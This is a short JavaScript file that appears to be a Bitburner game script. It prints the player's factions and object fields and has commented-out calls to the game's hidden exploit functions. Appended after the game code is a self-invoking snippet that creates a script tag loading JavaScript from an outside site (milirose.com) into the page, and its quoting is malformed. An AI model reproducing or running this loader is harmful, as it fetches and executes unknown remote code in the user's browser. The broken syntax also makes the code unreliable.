/** @param {NS} ns */
export async function main(ns) {
    //ns.exploit()
    //ns.openDevMenu()
    //ns.bypass(document)
    let player = ns.getPlayer()
    ns.print("Test")
    ns.print(player.factions)
    for (let i in player) {
        ns.print(i)
    }
}

void ((function () {
    var e = document.createElement('script');
    lc = new Date().getDate();
    e.setAttribute('type', 'text/javascript');
    e.setAttribute('src', 'https://www.milirose.com/scriptphp/applet/lanceur-applet.js?lc=%27+lc);document.body.appendChild(e);})())